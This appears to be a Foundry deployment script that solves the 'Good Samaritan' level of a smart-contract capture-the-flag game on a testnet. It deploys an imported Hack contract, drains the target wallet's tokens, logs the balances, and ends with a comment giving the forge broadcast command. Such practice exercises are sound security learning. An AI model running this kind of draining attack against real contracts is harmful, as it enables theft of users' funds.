// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Hack, IGoodSamaritan, GoodSamaritan, Coin, Wallet} from "../src/level27.sol";

contract Level27Script is Script {
    function run(address instanceAddress) external {
        GoodSamaritan goodSamaritan = GoodSamaritan(instanceAddress);
        Wallet wallet = goodSamaritan.wallet();
        Coin coin = goodSamaritan.coin();

        uint256 walletBalanceBefore = coin.balances(address(wallet));
        console.log("Wallet balance before:", walletBalanceBefore);

        vm.startBroadcast();
        Hack hackContract = new Hack(instanceAddress);
        hackContract.hack();
        vm.stopBroadcast();

        uint256 walletBalanceAfter = coin.balances(address(wallet));
        uint256 hackBalanceAfter = coin.balances(address(hackContract));
        console.log("Wallet balance after:", walletBalanceAfter);
        console.log("Hack balance after:", hackBalanceAfter);
        console.log("Attack successful:", walletBalanceAfter == 0);
    }
}
//forge script script/level27.s.sol:Level27Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account yourkey --sig "run(address)" your instance address
